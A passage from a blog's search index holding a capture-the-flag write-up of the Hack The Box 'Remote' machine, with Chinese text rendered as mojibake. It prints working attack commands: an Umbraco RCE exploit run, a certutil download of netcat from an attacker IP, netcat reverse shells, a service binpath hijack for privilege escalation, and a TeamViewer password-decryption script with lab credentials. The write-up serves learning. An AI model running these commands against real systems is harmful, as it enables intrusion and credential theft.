e354c05ba20bcdead66bf4122842c8bdc00ba9f89399270001493cbeaaa489ebb73fd36c5192c7f7be44b4e5d346edbf2e45bf654e9cddaacc1d8983e1fe26fe4d57d82040c8931cf553f564b97fba673fc3c05379128a03467a2f98c832fd4334719c153afd8c347b71f02615b251a80b8e155ea3042aedb7e2c92e20816523a99d8190e6119bf569e59e5c618c0e31198a62496aa59d399b6b264fd085a54727575ba3a258cc5e24e652c8e5180cec2d3c4ec24f986f0fc99f6ac07ca975803b1aeb59de117296ee79550096d3c384a865cbb8a296a0ac2504b2ecf2a4556a6de1da109eabd0f673c1fd30789e74df9c950efc03b06f3dcbdd9c6d74bf086bc62697ab7724d547deb77c6a4fe78c3d300868f304c248828be00771da5aa9dfc6f423a3d1d6f54a56ab7480b3a07df6812d08b95f6c620267b36d486d1564c497e06ed69e0d929a677d1508cc928e23368d44f0a0bd14fcd5f0a8244a89e05c1fe00ee9fb5629531917cb0b04409a36eea74e68b750957fd16e40ac2679bbb4ac7369d8c94e5ef09ae466faac58ec8cd53d623909b6215ad6ac0a55ee78137aa086623b745c3a762ece3249200fe43866a5a5d4fa5858e21650ea03ccd31e9116137d9b18fc950d823e6bbb1e1d7561484fec2fda506c4380584bb82d0fc60e30c72a261fe7caefceca2ded7b935725120b93633545510d2928b2124c7e59d47b1d8d5abeb60405d0f2d985ab0f4f085c4d1f1eb2f0de33c8fcc9be24035e9ddcd7a6f18b6fb56f5f8951ae5e08994efb7795ae0d703b13e31a0ea56e4b2fe96a7f8498bed323ac5bdd9c65819cec6fcbcd0503e424631ba706511602785189902d1158aadfb26ecbb74cd72c66811885af0f39c9199337ec89fbaaa49b3f798de9428342d51724a8b262ba903917b2b0574820bd6bb928621603be4e00991693e2a3c8c7af99c76193a153381715d14e70e6a33a04da8955fdbbc9ee7bc7415d9342bf233ea174e334e05a1a16f861a746b6e8cc5bf4d3b88daa32babfbabae0faa70ba81d5af7dd46027d039d7c075c5a5cca7bb1bc5ccb0dd15894654d63ba8a68fe6eafb9fe53ede583175c2d9a6b5ff52eb1ecaad2507c6ec3d7621b878e86ef5ab79d01f9a972c2abb2dc28d320e940d2ffdfab5611a913d02af98d5870daa6448088d9693aa1f2d12b2c71dc359aba596161019d656c56806cfb19b4f4a4e4fe981feac5693094c5cc9fac4452b7849ab752724d50845d2c37ff2cecfd0aea0ce431c80b934ee0c2b0a217dd2d00e6b48ed3ca90c2dffe991af067d8aa93ba451ce07d8c3a2d57d96763c5dcc1b421e3ec542373eba78d6fc9312080f1cbf37954aee9aac6bd627a20464b10a49acf3c34c804d48cf395a45b15e34f7ef05dba811607ff1bc411de6f6545dc718f739afb7e34529c1bba7da48329e9ba503d779260c222d513a404520829acae6d1d4f870c76e3647f5c9365b522636f553ce483be2cee14e953968eddb3c8e17e82e534b23df1733efa487ab5df2e1012dd07c06144f5c938e465f56dbed8b76d06169172cc05f3ab95356046f65626ee076863c9f13ecae7454527f5292f5b50550d5039580f8e4c3edcbe33661ca62c2f95db7dc077fd226a2df48e7398b04d5f47344ec036441e950f358373267d98d4df59adeaa669dc94a01bea773b1267b889cd9926794d5864388d41e77829b724e4348f72feffe5dfd3e4386719a8e19f7200464438e3ecc3258b2a9724748baffd07727d57d22d200c93f8a92f322536ef54c67246866bf7e19e0fde7b7f85b02753ad124d5badb81e35d7917bb7213b02c916005a2f134d6dfc27b803b011286b61d09f8ba2737605c287b348f8aadfd32f00faaf58604895ce96107a57683db3ce5aae93356b535cd87614d8747ab010d6b69d6fe33631d45fa54dfa63ce8b5c94fff76c9a49a253a8c3c3d567810aed0b319e2b0ef38ffad5320c8079c0f40f888acc027409cc0287274dc2e366be4deb6d7926897af5d349091c628f89f3608d28a8d7b6736ff9bf96af6ef44c1a0d03f10137b5fd637b8f21a7c36310a5d4b2c4127e3b5cb810f99f31eece0e27a5998eb6bcba1c30df2b90851aa3051ef9df49af5d2bb42136badcf8df9ab54ad4525734852db17b072b0e1571f988d3377f6953615b87584ca2b18feb8543e2a3973c7078bdeb0e4c0f866836f302f8be69b2798cbd1821b096cff18c1d91aefc8fb1ab4f979de3eb90262de736b2009ccef325dcb6a7661f946b7f9983cd01492905ebddb4e00298ce8476604922b49a3ffb908026b11a4ffb78756c4e298f76ccef692b8816124acb2761fac399fb6374e2e4ea0995566c19c7cf013395e4fd5681a9da8ab53db87ee66ead93a06594f5c891851f73998f50513e68790397a1f74bd8bb75f9e0b21bbd2a26d3827d24a4331c3443af584c72e31b0bd7e1a4972cf9fd5c8b4383e79ead674500598110ed8743cf25e77cc8cd7c51507a8d23c924a8efcb04b7fd34ea7e01cb54636835bf574a7dbf551d8eb44763b572913090956ba60adf5de0d8b4d7279db9a5a79340e85f3e00c720735b8983e2b1dcbcae5f210aa021903c99432f7f1bb8b99a843503daa6b3f03212dc7494069fb843f71defaadad6694c41008cfabefc2dbdd271f81ee43f84e942d4af261ebf18364d16cd92d66c8c8f5ca237af4e81e93db17c254fb2dbe7de7d72dc679d583f93b310b428b9d5a3e568dbda98ecf148a3ab9af7bc84120d8250e4010df425be405e44dcc0fb1bdbea2095330f6a10614738239eb4c3efc45d2287e44b28b21105d63648a25eed9e4a77cb80b299917095650a725e2d760b09f1af5c4de9060124bdf9b04bcfba2a95c4c012e9ef7bacd7363ce5caf5313b39541bb39510d7ee26e4cdd3503ed1739b06791df9f4e1d8b5347b8a7bcd6dbebf9d4d7c0414e2cdb7c84eca81f0f60f448b4cc95307dc15e3964f5db0598c8aea0effe84b33d3d0a16e14211f5d226fde9727c189aa80bf7e2dc2b61af4dbd185ba3523aa639d2b7c17b48af68873992f5ed4c499671f81a1a20e48e30d1b6f9c87de43a02be79da852524a58d57f07765f860ef1bc58d035996afee0e20151057f1145afed8184c70a3b3a5f04f551a4e2584e3b0591a50f49e38a6c91bcd60abccdd2ac128386cbbd551ddbd82ea4c7ce6fd734ec1daa6fdb8baeee212024d0cb3ab07f0b4e7252bbecf470fa5b5aa5c5170f61fad4d4608a6a8bd3f34377a78d7e7255d62cee3b19da7531a9a49eb239d9740deedab9d64c9282ef2d716b7f33fe4306c2f459efbbf27156036aaf806436626d1aae48fb7ce825f5f053b6a0aca71470c59300d360c7942688269fbf554b15281478ac12239cb90dd18b9da14c9f3082aadb67eaf839d65f08aa5b6a0c8edf60850c43f55fb807914671cd548e7f34a0d0f8e702f71306b7fde78573f1b0a28fcb51dadd5b95d0d22ead5ea97596a51310c93aea2cefb8febce264f4b34cad014d6fd3968bfb8f0c418c27a80a25ac9a35fcba8e0fca4cbaeed971957b063a9fc225f8769649d2d20ddde385d88fefbf742309f6cc22c213309272a6ace9aee5e21bfa4de5a7dbdfdc0f03c51f46cc607386b790f12c3f921c0c68ade2981b914b5674d93848f5a4c263c5bcc0d39b7143b3ce92147e20457b76757bff1926d76155298e75b86d6cbae055094eec38c624e09b7b5ad16a91aa10b14236fb5ec90d5473a5623ec179221f5af326d9c979081b7291544be8160db6654de8da2ace1cbdea2df5417ef594020e89d5d6a961dd0e641fc2fd613f4d17ba683d02c142bd908cce6c340eafecee76df42db1e62521be52b86c8a83d5953440753b3fbd8a7b47f0c20812c130a177665a9523b9f551ed6bf6967f52122ce991f7fae3ce18ed17d007e0ea2ac8ac0b615a09710293050de1b0d393e1857cca5b2b7449e8dd584438310dc3e8c4233c04a476686d439f0ed84bdaa70aaefc0c16cb13ca0868dbdaa65f9aed3dff0ed3624fc8ec900f7fb902094cc447fa1ae0753be4785087cebfd1bebac3c0bf85b30bcbbaaa9676e4cad8f0db0e82c2be0f5185498ed0d2640d935513ed0b00899392bff5c49ff7cab91f5a1fd0d315fd087a57ab5bb5429390e61ff097731b8990253c591afc0fac3922b675c465fd0cfd4923bab58bdafd510ef3578fb27aa32b18e63c48888e6cc50e849a6975f0e0c2e34b2b4a695858a76c6f268bfda6ddaebe305608320e6430f80640f03b9803b62b84abae2e2ecc256ee378a2c0d4d4d17890b3e32dc4d4d426dd17f678b9cd4f901410169d0d65469e5761e7aa2edebabde6a3d6e95a2e190ae0bc543c00f7637da652b6dfce9cc5c39f1f3e80b4c2ae7b186005eb0e6d5f22dbb9797cecd7237b982a8641d0f17b3eddc7b7e63758a537ce7fe40bb8ae925290e425b22a4f56e97f69368450e9d38d7a4a8e7e99ea6b28c123dcf24fa4286984eb59bee7f8bdc54b710876f18ccf8b312fcd08f92b8f166e59af8a124a8499633f1ba4d5ff9c223fe0dbad6a64585179dc766c795f0a6a4c4568c5f038345320c8fe513d35e0c8dc57819533018b24ddce3fb9060dc7d3fa85bcb3ee505c7c3426cf78003d24e7d0b21d7edc8e8f6a30763f6f5e3bca31d3b937a44474fb48ee3f69fccbf0043a934551ec51c29ae0a58c428f82aa88897e478263cfabe1556fa99a2891f8bb9eb486254544ea1a300549993d747f0a52322b4c00b05f9c508d0546a287ab740025a8bf20fc3404bad0cf8877f84a34f4800a64cbbaa9276ceea85ae77ca62639cf3d6ce63941867a9808078db8edd28a7e9335254c06e95a822013fae7cbfccb792ec8bdef422e42502face97fdd780f89fd3d89413a6c4e789d19b1d594c294907bd3652c04dc8ab8a201cdd9d15543b7dc71d3d5e77e322c9e28056aa725ad56e1c458f962cc8d0d91fa8db636ea5970cc88356d449d3b406f8136305cf8f42973928d49bb0225a388427be7bb7091959a5dafa56ac6d62ec14ae3e2047e40d063d03cc84c8c6aa0d0188333b06a84b76e591bacef4</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
      </tags>
  </entry>
  <entry>
    <title>htb remoteå¤ç›˜</title>
    <url>/2024/04/08/htb-remote%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>ä¸ºäº†å­¦windowsæ¸—é€ç›¸å…³å†…å®¹ï¼Œæ˜¨å¤©å†²åŠ¨äº†ä¸€æŠŠä¹°äº†htbä¸€ä¸ªæœˆçš„ä¼šå‘˜ï¼Œä¸ºäº†ä¸æµªè´¹è¿™ä¸€ç™¾å—é’±ï¼Œæ¥ä¸‹æ¥è¦å¥½å¥½å­¦ï¼</p>
<p>å…ˆåšçš„ç¬¬ä¸€ä¸ªå°±æ˜¯remoteé¶æœºï¼Œå…¨ç¨‹çœ‹ç€wpåšçš„ï¼Œç›¸æ¯”linuxï¼Œå¾ˆå¤šä¸œè¥¿éƒ½æ˜¯é™Œç”Ÿçš„ï¼Œè¿˜æ˜¯è¦å¤šåšå¤šå¤ç›˜æ‰èƒ½ç†Ÿæ‚‰è¿™ä¸ªä½“ç³»ï¼Œè®©çŸ¥è¯†æ·±å…¥æˆ‘å¿ƒã€‚</p>
<h5 id="ä¸»è¦å‚è€ƒæ–‡ç« "><a href="#ä¸»è¦å‚è€ƒæ–‡ç« " class="headerlink" title="ä¸»è¦å‚è€ƒæ–‡ç« "></a>ä¸»è¦å‚è€ƒæ–‡ç« </h5><p>å®˜æ–¹wp</p>
<p><a class="link"   href="https://cn-sec.com/archives/1330676.html" >https://cn-sec.com/archives/1330676.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/zongdeiqianxing/p/13568447.html" >https://www.cnblogs.com/zongdeiqianxing/p/13568447.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://segmentfault.com/a/1190000041183119#item-1" >https://segmentfault.com/a/1190000041183119#item-1<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="é¶æœºä¿¡æ¯"><a href="#é¶æœºä¿¡æ¯" class="headerlink" title="é¶æœºä¿¡æ¯"></a>é¶æœºä¿¡æ¯</h4><p>åœ°å€ï¼š<a class="link"   href="https://app.hackthebox.com/machines/Remote" >https://app.hackthebox.com/machines/Remote<i class="fas fa-external-link-alt"></i></a></p>
<p>éš¾åº¦ï¼šeasy</p>
<p>ipï¼š10.10.10.180</p>
<h4 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A -p- --min-rate=1000 -T4 10.10.10.180</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161050.png" ></p>
<p>ä¸€ä¸ªä¸€ä¸ªçœ‹ï¼Œå¼€äº†21ç«¯å£ï¼Œç”¨anonymousç™»é™†</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408161925.png" ></p>
<p>æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ï¼Œåˆ‡æ¢åˆ°ä¸‹ä¸€ä¸ªç«¯å£</p>
<p>æ¥åˆ°80ç«¯å£ï¼Œæ˜¯ä¸ªhttpæœåŠ¡ï¼Œwappalyzerè¯†åˆ«å‡ºæ˜¯Umbracoçš„CMS</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.21.27.png" ></p>
<p>ç„¶åæ‰¾åˆ°ä¸€ä¸ªç™»é™†ç‚¹</p>
<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2016.25.57.png"   style="zoom:25%;" >

<img     src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408162724.png"   style="zoom:50%;" >

<p>å‘ç°éœ€è¦emailï¼Œæ‰«ç›®å½•ä¹Ÿæ²¡æ‰«å‡ºä»€ä¹ˆï¼Œå†çœ‹çœ‹å…¶ä»–ç«¯å£,2049ç«¯å£æœ‰nfsæœåŠ¡ï¼Œshowmountçœ‹çœ‹æœ‰ä»€ä¹ˆä¸œè¥¿</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408163102.png" ></p>
<p><code>showmount -e</code> æ˜¯ NFS å‘½ä»¤çš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºæ˜¾ç¤ºè¿œç¨‹ NFS æœåŠ¡å™¨ä¸Šå…±äº«çš„ç›®å½•åˆ—è¡¨ã€‚</p>
<p>æœ‰ä¸ªç›®å½•ï¼ŒæŠŠå®ƒç»™æŒ‚è½½å‡ºæ¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mount -t nfs 10.10.10.180:/site_backups ./nfs -o nolock</span><br></pre></td></tr></table></figure>

<p><code>-t nfs</code>: æŒ‡å®šè¦æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ä¸º NFSã€‚</p>
<p><code>-o nolock</code>: ä½¿ç”¨ <code>nolock</code> é€‰é¡¹è¡¨ç¤ºç¦ç”¨æ–‡ä»¶é”å®šæœºåˆ¶ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒNFS æ–‡ä»¶ç³»ç»Ÿå¯èƒ½ä¼šé»˜è®¤å¯ç”¨æ–‡ä»¶é”å®šï¼Œä½†æ˜¯ä½¿ç”¨ <code>nolock</code> é€‰é¡¹å¯ä»¥ç¦ç”¨å®ƒã€‚</p>
<p>å®˜æ–¹ç»™äº†ä¸ªæç¤º <a class="link"   href="https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials" >è¿™ä¸ªé“¾æ¥<i class="fas fa-external-link-alt"></i></a>è¯´äº†UmbracoCMSçš„å¯†ç å‡­æ®å­˜æ”¾å¤„ï¼Œæ˜¯Umbraco.sdfï¼Œåœ¨App_Dataæ–‡ä»¶å¤¹é‡Œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings Umbraco.sdf|grep admin@</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164414.png" ></p>
<p>æ‰¾åˆ°äº†ä¸€ä¸²md5ï¼Œç”¨ç½‘ç«™è§£å¯†ï¼Œè§£å‡ºæ¥ä¸€ä¸²æ˜¯å¯†ç </p>
<p> <img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164510.png" ></p>
<p>æ‹¿ç€è´¦å·å¯†ç ç™»é™†åˆšåˆšçš„ç™»é™†æ¡†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin@htb.local:baconandcheese</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164719.png" ></p>
<p>æˆåŠŸç™»é™†åçœ‹åˆ°è¿™ä¸ªCMSçš„ç‰ˆæœ¬æ˜¯7.12.4ï¼Œåœ¨ç½‘ä¸Šèƒ½æ‰¾åˆ°ç›¸å…³çš„RCEæ¼æ´</p>
<p>pocï¼š<a class="link"   href="https://github.com/noraj/Umbraco-RCE.git" >https://github.com/noraj/Umbraco-RCE.git<i class="fas fa-external-link-alt"></i></a></p>
<p>ä¸‹è½½ä¸‹æ¥åå°è¯•å‘½ä»¤æ‰§è¡Œ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408164903.png" ></p>
<p>æ˜¯æˆåŠŸçš„ï¼Œæ¥ä¸‹æ¥åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c  cmd.exe -a &#x27;/c certutil.exe -urlcache -split -f http://10.10.16.3/nc64.exe C:/Users/Public/nc.exe&#x27;</span><br></pre></td></tr></table></figure>

<p><code>-urlcache</code>: è¿™ä¸ªå‚æ•°å‘Šè¯‰ <code>certutil.exe</code> ä¸‹è½½æŒ‡å®š URL ä¸­çš„å†…å®¹åˆ°æœ¬åœ°ã€‚</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165113.png" ></p>
<p>ä¸‹è½½ä¸€ä¸ªncåˆ°é¶æœºï¼Œå†è°ƒç”¨ï¼Œæœ¬åœ°å¼€å¯ç›‘å¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -u admin@htb.local -p baconandcheese -i http://10.10.10.180 -c cmd.exe -a &#x27;/c c:/users/public/nc.exe 10.10.16.3 4444 -e powershell&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408165355.png" ></p>
<p>æˆåŠŸæ‹¿åˆ°ç¬¬ä¸€ä¸ªshell</p>
<h4 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h4><h5 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h5><p>ä¸Šä¼ è¾…åŠ©å·¥å…·winPEASx64.exe</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">certutil.exe -urlcache -split -f http://10.10.16.3/winPEASany.exe a.exe</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171454.png" ></p>
<p>å‘ç°ç”¨æˆ·IISå¯¹UsoSvcæœåŠ¡æœ‰å¼€å¯å…³é—­æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sc.exe qc UsoSvc # æŸ¥è¯¢æœåŠ¡è¯¦ç»†ä¿¡æ¯</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408171658.png" ></p>
<p>æ€è·¯æ˜¯å…ˆåœæ­¢è¿™ä¸ªæœåŠ¡ï¼Œç„¶åä¿®æ”¹æœåŠ¡ä¸­çš„ç¨‹åºè·¯å¾„ï¼Œå†é‡å¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. sc.exe stop UsoSvc</span><br><span class="line">2. sc.exe config UsoSvc binpath= &quot;c:/users/public/nc.exe 10.10.16.3 3333 -e powershell&quot;</span><br><span class="line">3. sc.exe start UsoSvc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408172259.png" ></p>
<p>ç„¶åæœ¬åœ°å¼€å¯ç›‘å¬ï¼Œå°±æ‹¿åˆ°systemæƒé™ï¼Œè¿™é‡Œæœ‰ä¸ªé—®é¢˜æ˜¯è¿™ä¸ªshellä¼šå¾ˆå¿«å°±æ–­å¼€ï¼Œå¯ä»¥æ‹¿åˆ°åå†åå¼¹ä¸€æ¬¡</p>
<h5 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h5><p>æŸ¥æ‰¾æœ¬æœºæ‰€æœ‰æ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ä»¥åŠå®ƒä»¬æ‰€æ‰˜ç®¡çš„æœåŠ¡ï¼Œæ‰¾åˆ°<code>TeamViewer</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tasklist /svc</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.30.40.png" ></p>
<p>æœ‰ä¸€ä¸ª<a class="link"   href="https://www.cnblogs.com/unicodeSec/p/12294868.html" >CVE-2019-18988<i class="fas fa-external-link-alt"></i></a>ï¼Œteamviewerå°†ç”¨æˆ·åå¯†ç ç¡¬ç¼–ç è‡³æ³¨å†Œè¡¨ä¸­ï¼ŒåŠ å¯†ç®—æ³•æ˜¯ï¼š<code>AES-128-CBC</code></p>
<p>å…¶ä¸­keyçš„å€¼ï¼š0602000000a400005253413100040000ï¼Œivçš„å€¼ï¼š0100010067244F436E6762F25EA8D704 æ˜¯å›ºå®šçš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query HKLM\SOFTWARE\Wow6432Node\TeamViewer\Version7</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹TeamViewerè¯¦ç»†ä¿¡æ¯ï¼Œæ‰¾åˆ°SecurityPasswordAES<code>çš„å€¼</code>FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B</p>
<p>ç”¨ä»¥ä¸‹è„šæœ¬è§£å¯†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys, hexdump, binascii</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AESCipher</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key</span>):</span><br><span class="line">        self.key = key</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">self, iv, data</span>):</span><br><span class="line">        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)</span><br><span class="line">        <span class="keyword">return</span> self.cipher.decrypt(data)</span><br><span class="line"></span><br><span class="line">key = binascii.unhexlify(<span class="string">&quot;0602000000a400005253413100040000&quot;</span>)</span><br><span class="line">iv = binascii.unhexlify(<span class="string">&quot;0100010067244F436E6762F25EA8D704&quot;</span>)</span><br><span class="line">hex_str_cipher = <span class="string">&quot;FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B&quot;</span>            <span class="comment"># output from the registry</span></span><br><span class="line"></span><br><span class="line">ciphertext = binascii.unhexlify(hex_str_cipher)</span><br><span class="line"></span><br><span class="line">raw_un = AESCipher(key).decrypt(iv, ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(raw_un))</span><br><span class="line"></span><br><span class="line">password = raw_un.decode(<span class="string">&#x27;utf-16&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2017.57.41.png" ></p>
<p>è§£å‡ºå¯†ç :!R3m0te!</p>
<p>æµ‹è¯•è¿™ä¸ªå¯†ç èƒ½å¦ç™»é™†</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.180 -u administrator -p &#x27;!R3m0te!&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174116.png" ></p>
<p>æ˜¯å¯ä»¥çš„ï¼Œç„¶åå°±ç”¨Evil-WinRMç™»é™†ï¼ŒææƒæˆåŠŸ</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408174240.png" ></p>
<h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><p>æ¶‰åŠçŸ¥è¯†ç‚¹ï¼šnfsæŒ‚è½½ï¼Œpocåˆ©ç”¨ï¼Œwindowsåå¼¹shellï¼Œwindowsææƒï¼ŒTeamViewerææƒã€‚ã€‚ã€‚</p>
<p>æ•´ä½“æ€è·¯ï¼šftpæ‰¾ä¸åˆ°æœ‰ç”¨æ–‡ä»¶â€“&gt;80ç«¯å£httpæœåŠ¡æ‰¾åˆ°CMSå’Œç™»é™†æ¡†â€“&gt;nfsæœåŠ¡å‘ç°æ–‡ä»¶å¤¹ï¼ŒæŒ‚è½½å‡ºæ¥â€“&gt;æ‰¾åˆ°adminçš„è´¦å·å¯†ç â€“&gt;ç™»é™†CMSåå‘ç°ç›¸å…³ç‰ˆæœ¬â€“&gt;æ‰¾åˆ°å…¬å¼€æ¼æ´pocè¿›è¡ŒRCEâ€“&gt;è·å¾—ä¸€ä¸ªshellâ€“&gt;è‡ªåŠ¨åŒ–ææƒå·¥å…·æ‰¾åˆ°UsoSvcææƒ&#x2F;æ‰¾åˆ°æœ‰TeamvieweræœåŠ¡ç”¨å…¬å¼€æ–¹æ³•è§£å¯†å‡ºè„šæœ¬ç™»é™†adminitrator</p>
<p>æ€»ä½“æ€è·¯åº”è¯¥ç®—æ˜¯ç®€å•çš„ï¼Œæ€è·¯ä¸æ›²æŠ˜ï¼Œè¿‡ç¨‹ä¸­æ¥è§¦åˆ°çš„ä¸œè¥¿å‡ ä¹éƒ½æ˜¯æ–°çš„ï¼Œæ‰€ä»¥å†™ä¸‹æ¥ï¼Œä»¥åå°±äº†è§£äº†ã€‚</p>
]]></content>
      <tags>
        <tag>å¤ç›˜</tag>
        <tag>htb</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>shè„šæœ¬ä¸­==åˆ¤æ–­çš„å‡ ä¸ªæƒ…å†µ</title>
    <url>/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h4 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h4><p>ä»Šå¤©çœ‹åˆ°ä¸€ä¸ªè„šæœ¬éœ€è¦çˆ†ç ´å¯†ç ï¼Œæˆ‘åœ¨å·²çŸ¥å¯†ç æ˜¯18ä½çš„æƒ…å†µä¸‹ï¼Œå¦„æƒ³å†™ä¸ªè„šæœ¬å»çˆ†ç ´ï¼Œè‚¯å®šæ˜¯å¤±è´¥çš„ï¼Œæœ€åçœ‹åˆ°æ­£ç¡®çš„è„šæœ¬ï¼Œæˆ‘æ³¨æ„åˆ°é‡Œé¢ç”¨åˆ°*ï¼Œæœ€å¼€å§‹çš„ç†è§£æ˜¯é€šé…ç¬¦ç»•è¿‡å»äº†ï¼Œç»è¿‡shellè„šæœ¬å¤§ä½¬Â·ç¾¤ä¸»è€å¸ˆÂ·äº‘æ·¡__é£è½»çš„ç‚¹æ‹¨ï¼Œæˆ‘äº†è§£åˆ°ä¸€ä¸ªå…³äºshellè„šæœ¬çš„çŸ¥è¯†ç‚¹ï¼Œæœ‰å¿…è¦å†™ä¸ªç¬”è®°è®°å½•ä¸€ä¸‹ã€‚</p>
<h4 id="è¿›å…¥æ­£é¢˜"><a href="#è¿›å…¥æ­£é¢˜" class="headerlink" title="è¿›å…¥æ­£é¢˜"></a>è¿›å…¥æ­£é¢˜</h4><h5 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="&#x3D;&#x3D;ç»•è¿‡"></a>&#x3D;&#x3D;ç»•è¿‡</h5><p>å…ˆçœ‹è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">password=&#x27;qwe123&#x27;</span><br><span class="line"></span><br><span class="line">read -p &quot;input pass:&quot; input</span><br><span class="line">if [[ $password == $input ]];then</span><br><span class="line">    echo &quot;ok&quot;</span><br><span class="line">else</span><br><span class="line">    echo &quot;not ok&quot;</span><br><span class="line"></span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

